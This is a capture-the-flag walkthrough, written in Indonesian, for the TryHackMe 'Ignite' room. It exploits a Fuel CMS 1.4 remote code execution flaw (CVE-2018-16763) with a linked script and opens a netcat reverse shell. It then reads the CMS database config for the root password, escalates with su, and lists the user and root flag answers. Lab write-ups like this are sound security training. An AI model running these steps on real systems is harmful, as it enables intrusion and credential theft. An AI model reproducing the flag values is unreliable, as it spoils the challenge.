# Ignite
- TryHackMe Room: https://tryhackme.com/room/ignite
- IP Machine: 10.10.116.227

## Task 1 Root it!
- Scanning server menggunakan nmap. Disini hanya ada 1 port yang terbuka, yaitu port 80 (http)
```sh
nmap -sV -sC <IP_Machine>
```

- Buka halaman web `http://<IP_Machine>` di browser. Disini terlihat bahwa halaman ini adalah halaman default fuel CMS versi 1.4

- Di halaman tersebut terdapat informasi dimana letak file konfigurasi database

- Di halaman tersebut juga terdapat informasi cara mengakses halaman admin dan default credential

- Sekarang kita coba akses halaman admin dengan url `http://<IP_Machine>/fuel` dan kita langsung diarahkan ke halaman login. Sekarang kita isi username dan password dengan default credential diatas

- Kita berhasil masuk ke halaman admin, tapi tidak ditemukan hal menarik disini

- Berdasarkan riset, fuel CMS versi 1.4 rentan terhadap serangan Remote Code Execution ( CVE 2018-16763 )


- Kita bisa memanfaatkan script python3 di link https://gist.github.com/anir0y/8529960c18e212948b0e40ed1fb18d6d#file-fuel-cms-py untuk melakukan exploitasi pada fuel CMS versi 1.4
- Sekarang kita buat sebuah listener netcat di terminal baru
```sh
nc -lnvp <port>
```

- Jalankan script fuel-cms.py
```sh
python3 fuel-cms.py <IP_Machine>
```

- Ketik `shell_me` kemudian masukkan IP tun0 pada komputer anda lalu nomor port yang digunakan listener netcat tadi dengan format sebagai berikut
```sh
<IP_tun0>:<port>
```

- Disini listener netcat berhasil terkoneksi dengan server dan masuk sebagai user **www-data**

- Selanjutnya kita buka file konfigurasi database fuel CMS, disana terdapat nama user root dan password
```sh
cat fuel/application/config/database.php
```

- Kita juga berhasil menemukan lokasi dan isi user flag
```sh
cat /home/www-data/flag.txt
```

- Untuk mengakses user root kita perlu mengubah shell menjadi terminal interaktif
```sh
python -c 'import pty; pty.spawn("/bin/bash")'
```

- Sekarang kita switch ke user root lalu masukkan password yang sudah ditemukan tadi. Disini kita berhasil mengakses user root
```sh
su root
```

- Sekarang kita buka isi root flag
```sh
cat /root/root.txt
```

- **Pertanyaan:** User.txt
- **Jawaban:**
```sh
6470e394cbf6dab6a91682cc8585059b
```
- **Pertanyaan:** Root.txt
- **Jawaban:**
```sh
b9bbcb33e11b80be759c4e844862482d
```